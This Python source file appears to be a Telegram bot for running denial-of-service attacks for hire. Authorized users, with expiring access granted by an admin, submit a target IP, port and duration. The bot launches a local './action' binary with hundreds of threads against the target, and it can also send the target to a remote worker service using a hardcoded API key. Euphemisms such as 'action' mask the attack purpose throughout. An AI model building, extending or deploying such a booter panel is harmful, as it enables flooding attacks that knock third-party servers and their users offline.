import os
import re
import subprocess
import telebot
from threading import Timer
import time
import ipaddress
import logging
import random
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InputFile
from datetime import datetime, timedelta
import pytz
import requests

# Initialize logging for better monitoring
logging.basicConfig(filename='bot_actions.log', level=logging.INFO, 
                    format='%(asctime)s - %(message)s')

# Initialize the bot with the token from environment variables
TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
if not TOKEN:
    raise ValueError("Please set your bot token in the environment variables!")

bot = telebot.TeleBot(TOKEN)

# Timezone for Kolkata (GMT +5:30)
kolkata_tz = pytz.timezone('Asia/Kolkata')

# File to store authorizations
AUTHORIZATION_FILE = 'authorizations.txt'

# List of authorized users (initially empty, to be loaded from file)
authorized_users = {}

# List of authorized user IDs (admins)
AUTHORIZED_USERS = [6800732852]

# Regex pattern to match the IP, port, and duration
pattern = re.compile(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})\s(\d+)")

# Dictionary to keep track of subprocesses and timers
processes = {}

# Dictionary to store user modes (manual or auto)
user_modes = {}

# Store supporter mode status for users
supporter_users = {}

# Dictionary to track actions by user
active_users = {}  # Format: {user_id: {"username": str, "action": str, "process": subprocess, "expire_time": datetime}}

# Load existing authorizations from file, if any
def load_authorizations():
    if not os.path.exists(AUTHORIZATION_FILE):
        open(AUTHORIZATION_FILE, 'w').close()  # Create the file if it doesn't exist
    
    with open(AUTHORIZATION_FILE, 'r') as file:
        for line in file:
            user_id, expire_time, status = line.strip().split(' | ')
            expire_time = datetime.strptime(expire_time, '%Y-%m-%d %H:%M:%S')
            expire_time = kolkata_tz.localize(expire_time)  # Make it timezone-aware
            authorized_users[int(user_id)] = {'expire_time': expire_time, 'status': status}

def save_authorizations():
    with open(AUTHORIZATION_FILE, 'w') as file:
        for user_id, info in authorized_users.items():
            file.write(f"{user_id} | {info['expire_time'].strftime('%Y-%m-%d %H:%M:%S')} | {info['status']}\n")

# Check if a user is authorized and their authorization hasn't expired
def is_authorized(user_id):
    user_info = authorized_users.get(user_id)
    if user_info and user_info['status'] == 'authorized':
        now = datetime.now(kolkata_tz)
        if now < user_info['expire_time']:
            return True
        else:
            # Authorization expired
            authorized_users[user_id]['status'] = 'expired'
            save_authorizations()
    return False

# Helper function to notify admins of a new authorization request
def notify_admins(user_id, username):
    message = (
        f"🔔 *New Authorization Request*\n\n"
        f"👤 User: @{username} (ID: {user_id})\n"
        f"⏳ Please approve or reject the request."
    )
    for admin_id in AUTHORIZED_USERS:
        bot.send_message(admin_id, message, parse_mode='Markdown')

# Validate IP
def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

# Validate port
def is_valid_port(port):
    return 1 <= int(port) <= 65535

# Validate duration
def is_valid_duration(duration):
    return int(duration) > 0 and int(duration) <= 600  # max 600 seconds (10 minutes)

# Periodically check for expired authorizations
def check_expired_users():
    now = datetime.now(kolkata_tz)
    expired_users = []

    # Check for expired users
    for user_id, info in list(authorized_users.items()):
        if info['status'] == 'authorized' and now >= info['expire_time']:
            bot.send_message(user_id, "⛔ *Your access has expired! Please renew your access.*", parse_mode='Markdown')
            expired_users.append(user_id)

    # Remove expired users from the authorized list and save
    for user_id in expired_users:
        del authorized_users[user_id]
    save_authorizations()

    # Check again after 30 minutes
    Timer(1800, check_expired_users).start()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create the button markup
    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    manual_button = KeyboardButton('Manual Mode')
    auto_button = KeyboardButton('Auto Mode')
    markup.add(manual_button, auto_button)

    welcome_text = (
        "👋 *Hey there! Welcome to Action Bot!*\n\n"
        "I'm here to help you manage actions easily and efficiently. 🚀\n\n"
        "🔹 To *start* an action, you can choose between:\n"
        "1. Manual Mode: Enter IP, port, and duration manually.\n"
        "2. Auto Mode: Enter IP and port, and I'll choose a random duration for you.\n\n"
        "🔹 Want to *stop* all ongoing actions? Just type:\n"
        "stop all\n\n"
        "🔐 *Important:* Only authorized users can use this bot in private chat. 😎\n\n"
        "🤖 _This bot was made by Ibr._"
    )
    bot.reply_to(message, welcome_text, parse_mode='Markdown', reply_markup=markup)

# Mode selection handler
@bot.message_handler(func=lambda message: message.text in ['Manual Mode', 'Auto Mode'])
def set_mode(message):
    user_id = message.from_user.id
    selected_mode = message.text.lower().split()[0]  # 'manual' or 'auto'
    
    # Update the user's mode
    user_modes[user_id] = selected_mode
    bot.reply_to(message, f"🔄 *Mode switched to {selected_mode.capitalize()} Mode!*")

@bot.message_handler(commands=['get_auth_file'])
def send_authorization_file(message):
    user_id = message.from_user.id

    # Check if the user is an authorized admin or has valid authorization status
    if user_id in AUTHORIZED_USERS or is_authorized(user_id):
        # Check if the file exists
        if os.path.exists(AUTHORIZATION_FILE):
            with open(AUTHORIZATION_FILE, 'rb') as auth_file:
                bot.send_document(user_id, InputFile(auth_file), caption="Here is the authorization file you requested.")
            logging.info(f"User {user_id} has successfully downloaded the authorization file.")
        else:
            bot.reply_to(message, "⚠️ The authorization file does not exist.", parse_mode='Markdown')
    else:
        bot.reply_to(message, "⛔ You are not authorized to access this file.", parse_mode='Markdown')
        logging.warning(f"Unauthorized user {user_id} attempted to download the authorization file.")

# Command to show the list of active users and actions (admin only)
@bot.message_handler(commands=['list_active'])
def list_active_users(message):
    user_id = message.from_user.id
    if user_id not in AUTHORIZED_USERS:
        bot.reply_to(message, "⛔ You are not authorized to view the active users.", parse_mode='Markdown')
        return

    if not active_users:
        bot.reply_to(message, "⚠️ No active users at the moment.", parse_mode='Markdown')
        return

    active_list = "🟢 *Active Users and Actions:*\n"
    for uid, info in active_users.items():
        action = info.get("action", "Unknown action")
        active_list += f"👤 User: {info['username']} (ID: {uid})\n🔹 Action: {action}\n\n"

    bot.reply_to(message, active_list, parse_mode='Markdown')

@bot.message_handler(commands=['approve'])
def approve_user(message):
    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
        bot.reply_to(message, "⛔ *You are not authorized to approve users.*", parse_mode='Markdown')
        return
    
    try:
        # Command format: /approve <user_id> <duration>
        _, user_id, duration = message.text.split()
        user_id = int(user_id)

        now = datetime.now(kolkata_tz)
        expire_time = None
        
        # Custom duration parsing
        time_match = re.match(r"(\d+)([dhm])", duration)
        if time_match:
            value, unit = time_match.groups()
            value = int(value)
            if unit == 'h':
                expire_time = now + timedelta(hours=value)
            elif unit == 'd':
                expire_time = now + timedelta(days=value)
            elif unit == 'm':
                expire_time = now + timedelta(days=30 * value)
        elif duration == 'permanent':
            expire_time = now + timedelta(days=365*100)  # 100 years for permanent
        
        if expire_time:
            authorized_users[user_id] = {'expire_time': expire_time, 'status': 'authorized'}
            save_authorizations()

            bot.reply_to(message, f"✅ *User {user_id} has been authorized for {duration}!* 🎉", parse_mode='Markdown')
            bot.send_message(user_id, "🎉 *You are now authorized to use the bot! Enjoy!* 🚀", parse_mode='Markdown')
            logging.info(f"Admin {message.from_user.id} approved user {user_id} for {duration}")
        else:
            bot.reply_to(message, "❌ *Invalid duration format!* Please use 'Xd', 'Xh', 'Xm', or 'permanent'.", parse_mode='Markdown')

    except ValueError:
        bot.reply_to(message, "❌ *Invalid command format!* Use `/approve <user_id> <duration>`.", parse_mode='Markdown')

@bot.message_handler(commands=['reject'])
def reject_user(message):
    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
        bot.reply_to(message, "⛔ *You are not authorized to reject users.*", parse_mode='Markdown')
        return

    try:
        _, user_id = message.text.split()
        user_id = int(user_id)
        
        if user_id in authorized_users and authorized_users[user_id]['status'] == 'pending':
            authorized_users[user_id]['status'] = 'rejected'
            save_authorizations()
            bot.reply_to(message, f"🛑 *User {user_id}'s application has been rejected.*", parse_mode='Markdown')
            logging.info(f"Admin {message.from_user.id} rejected user {user_id}'s application.")

            # Notify the user that their application was rejected
            bot.send_message(user_id, "❌ *Your authorization request has been declined by the admin.*", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"⚠️ *User {user_id} has no pending application.*", parse_mode='Markdown')

    except ValueError:
        bot.reply_to(message, "❌ *Invalid command format!* Use `/reject <user_id>`.", parse_mode='Markdown')


@bot.message_handler(commands=['remove'])
def remove_user(message):
    if message.chat.type != 'private' or message.from_user.id not in AUTHORIZED_USERS:
        bot.reply_to(message, "⛔ *You are not authorized to remove users.*", parse_mode='Markdown')
        return

    try:
        _, user_id = message.text.split()
        user_id = int(user_id)
        
        if user_id in authorized_users:
            del authorized_users[user_id]
            save_authorizations()
            bot.reply_to(message, f"🚫 *User {user_id} has been removed from the authorization list.*", parse_mode='Markdown')
            logging.info(f"Admin {message.from_user.id} removed user {user_id}.")
            # Notify the user that their application was rejected
            bot.send_message(user_id, "❌ *Your access has been removed by the admin.* Please contact to the provider for more information", parse_mode='Markdown')
        else:
            bot.reply_to(message, f"⚠️ *User {user_id} is not in the authorization list.*", parse_mode='Markdown')

    except ValueError:
        bot.reply_to(message, "❌ *Invalid command format!* Use `/remove <user_id>`.", parse_mode='Markdown')

@bot.message_handler(commands=['auth'])
def request_authorization(message):
    user_id = message.from_user.id
    username = message.from_user.username if message.from_user.username else 'Unknown'

    # Check if the user is already in the AUTHORIZED_USERS list
    if user_id in AUTHORIZED_USERS:
        bot.reply_to(message, "🎉 *You're already a trusted admin!* No need for authorization.", parse_mode='Markdown')
        return

    if is_authorized(user_id):
        bot.reply_to(message, "🎉 *You're already authorized to use the bot!*", parse_mode='Markdown')
        return
    
    bot.reply_to(message, (
        f"🔒 *Authorization Requested!* Please wait for the admin to approve your request.\n\n"
        f"👤 Your user ID: {user_id}\n"
        f"👤 Username: @{username}\n\n"
        "An admin will review your request soon. 🙌"
    ), parse_mode='Markdown')

    # Notify all admins
    notify_admins(user_id, username)

    # Log the request for the admin
    logging.info(f"User {user_id} ({username}) requested authorization")

@bot.message_handler(commands=['worker'])
def get_worker_status(message):
    """Fetch the status of workers from the server."""
    try:
        response = requests.get(
            'https://lm6000k.pythonanywhere.com/status',
            headers={'API-Key': 'fukbgmiservernow'}  # Your API key
        )
        if response.status_code == 200:
            worker_status = response.json()
            online_workers = worker_status.get('online_workers', [])
            bot.reply_to(message, "✅ *Worker List!* {online_workers}.", parse_mode='Markdown')
            return online_workers
        else:
            bot.reply_to(message, f"Failed to fetch worker status. Status code: {response.status_code}, Response: {response.text}")
            return []
    except Exception as e:
        bot.reply_to(message, f"Error fetching worker status: {e}")
        return []
    
@bot.message_handler(commands=['supporter_mode'])
def activate_supporter_mode(message):
    user_id = message.from_user.id
    supporter_users[user_id] = True  # Activate supporter mode for the user
    bot.reply_to(message, "✅ *Supporter mode activated!* Your actions will now be handled by the worker service.", parse_mode='Markdown')

@bot.message_handler(commands=['disable_supporter_mode'])
def disable_supporter_mode(message):
    user_id = message.from_user.id
    supporter_users[user_id] = False  # Deactivate supporter mode for the user
    bot.reply_to(message, "✅ *Supporter mode deactivated!* Your actions will be handled locally.", parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    chat_type = message.chat.type
    
    # Skip authorization check if the user is in the AUTHORIZED_USERS list
    if chat_type == 'private' and user_id not in AUTHORIZED_USERS and not is_authorized(user_id):
        bot.reply_to(message, '⛔ *You are not authorized to use this bot.* Please send /auth to request access. 🤔\n\n_This bot was made by Ibr._', parse_mode='Markdown')
        return

    text = message.text.strip().lower()

    # Skip if the user is selecting mode
    if text in ['manual mode', 'auto mode']:
        return

    user_mode = user_modes.get(user_id, 'manual')  # Default to 'manual' if mode not set

    if text == 'stop all':
        stop_all_actions(message)
        return

    if user_mode == 'auto':
        # Auto mode logic
        match = re.match(r"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)\s(\d{1,5})", text)
        if match:
            ip, port = match.groups()
            duration = random.randint(80, 120)
            
            # Validate IP and Port
            if not is_valid_ip(ip):
                bot.reply_to(message, "❌ *Invalid IP address!* Please provide a valid IP.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
                return
            if not is_valid_port(port):
                bot.reply_to(message, "❌ *Invalid Port!* Port must be between 1 and 65535.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
                return

            # Respond to user
            bot.reply_to(message, (
                f"🔧 *Got it! Starting action in Auto Mode...* 💥\n\n"
                f"🌍 *Target IP:* `{ip}`\n"
                f"🔌 *Port:* `{port}`\n"
                f"⏳ *Duration:* `{duration} seconds`\n\n"
                "Hang tight, action is being processed... ⚙️\n\n"
                "_This bot was made by Ibr._"
            ), parse_mode='Markdown')
            run_action(user_id, message, ip, port, duration)
        else:
            bot.reply_to(message, "⚠️ *Oops!* Please provide the IP and port in the correct format: `<ip> <port>`.\n\n_This bot was made by Ibr._", parse_mode='Markdown')

    elif user_mode == 'manual':
        # Manual mode logic
        match = pattern.match(text)
        if match:
            ip, port, duration = match.groups()

            # Validate IP, Port, and Duration
            if not is_valid_ip(ip):
                bot.reply_to(message, "❌ *Invalid IP address!* Please provide a valid IP.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
                return
            if not is_valid_port(port):
                bot.reply_to(message, "❌ *Invalid Port!* Port must be between 1 and 65535.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
                return
            if not is_valid_duration(duration):
                bot.reply_to(message, "❌ *Invalid Duration!* The duration must be between 1 and 600 seconds.\n\n_This bot was made by Ibr._", parse_mode='Markdown')
                return

            bot.reply_to(message, (
                f"🔧 *Got it! Starting action in Manual Mode...* 💥\n\n"
                f"🌍 *Target IP:* `{ip}`\n"
                f"🔌 *Port:* `{port}`\n"
                f"⏳ *Duration:* `{duration} seconds`\n\n"
                "Hang tight, action is being processed... ⚙️\n\n"
                "_This bot was made by Ibr._"
            ), parse_mode='Markdown')
            run_action(user_id, message, ip, port, duration)
        else:
            bot.reply_to(message, (
                "⚠️ *Oops!* The format looks incorrect. Let's try again:\n"
                "`<ip> <port> <duration>`\n\n"
                "For example, type `192.168.1.100 8080 60` to run an action for 60 seconds.\n\n"
                "_This bot was made by Ibr._"
            ), parse_mode='Markdown')

# Function to dynamically show stop action button for each user
def show_stop_action_button(message):
    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    stop_button = KeyboardButton('Stop Action')
    markup.add(stop_button)
    #bot.send_message(message.chat.id, "🛑 *Press Stop Action to terminate your current action.*", reply_markup=markup, parse_mode='Markdown')

def run_action(user_id, message, ip, port, duration):

    # Generate random therad
    therad_value = random.randint(190, 800)

    # Show the stop action button
    show_stop_action_button(message)
    # Log the action
    logging.info(f"User {user_id} started action on IP {ip}, Port {port}, Duration {duration}s")

    # Run the action command
    full_command = f"./action {ip} {port} {duration} {therad_value}"
    process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    processes[process.pid] = process

    if supporter_users.get(user_id, False):
        # If the user is using supporter mode, send the action to an external endpoint
        try:
            result = submit_task_to_worker(ip, port, duration)
            print("Task submitted successfully:", result)
            bot.reply_to(message, "🎉 *Task successfully submitted to the supporter service!* The worker will process it soon. 🚀 Result: {result}", parse_mode='Markdown')
        except Exception as e:
            bot.reply_to(message, f"⚠️ *Failed to submit task to the worker service!* Error: {str(e)}", parse_mode='Markdown')
            logging.error(f"Error submitting task to worker for {user_id}: {str(e)}")

    # Schedule a timer to check process status after duration
    timer = Timer(int(duration), check_process_status, [message, process, ip, port, duration])
    timer.start()

def submit_task_to_worker(ip, port, duration):
    # The endpoint of the worker service
    worker_endpoint = 'https://lm6000k.pythonanywhere.com/submit_task'

    # Data to be sent to the worker
    task_data = {
        'ip': ip,
        'port': port,
        'duration': duration
    }

    # Prepare headers with API key
    headers = {
        'API-Key': 'fukbgmiservernow'  # Your API key
    }

    try:
        # Send POST request to worker service with headers
        response = requests.post(worker_endpoint, json=task_data, headers=headers)

        # Raise an exception if the request failed
        if response.status_code != 200:
            raise Exception(f"Failed to submit task. Status code: {response.status_code}, Response: {response.text}")

        # Optionally return the response for further processing
        return response.json()  # If you expect a JSON response

    except requests.exceptions.RequestException as e:
        raise Exception(f"Error while making request: {e}")


def check_process_status(message, process, ip, port, duration):
    return_code = process.poll()
    if return_code is None:
        process.terminate()
        process.wait()
    
    processes.pop(process.pid, None)

    # Create the button markup
    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    manual_button = KeyboardButton('Manual Mode')
    auto_button = KeyboardButton('Auto Mode')
    markup.add(manual_button, auto_button)

    bot.reply_to(message, (
        f"✅ *Action completed successfully!* 🎉\n\n"
        f"🌐 *Target IP:* `{ip}`\n"
        f"🔌 *Port:* `{port}`\n"
        f"⏱ *Duration:* `{duration} seconds`\n\n"
        "💡 *Need more help?* Just send me another request, I'm here to assist! 🤗\n\n"
        "_This bot was made by Ibr._"
    ), parse_mode='Markdown', reply_markup=markup)

def stop_all_actions(message):
    if processes:
        for pid, process in list(processes.items()):
            process.terminate()
            process.wait()
            processes.pop(pid, None)
        bot.reply_to(message, "🛑 *All actions have been stopped!* 🙅‍♂️", parse_mode='Markdown')
    else:
        bot.reply_to(message, "🤔 *No ongoing actions to stop.*", parse_mode='Markdown')

# Start the bot
if __name__ == '__main__':
    
    logging.info("Starting the bot...")
    # Initialize authorized users when bot starts
    load_authorizations()
    # Start periodic expiration check when the bot starts
    check_expired_users()
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Error occurred: {str(e)}")
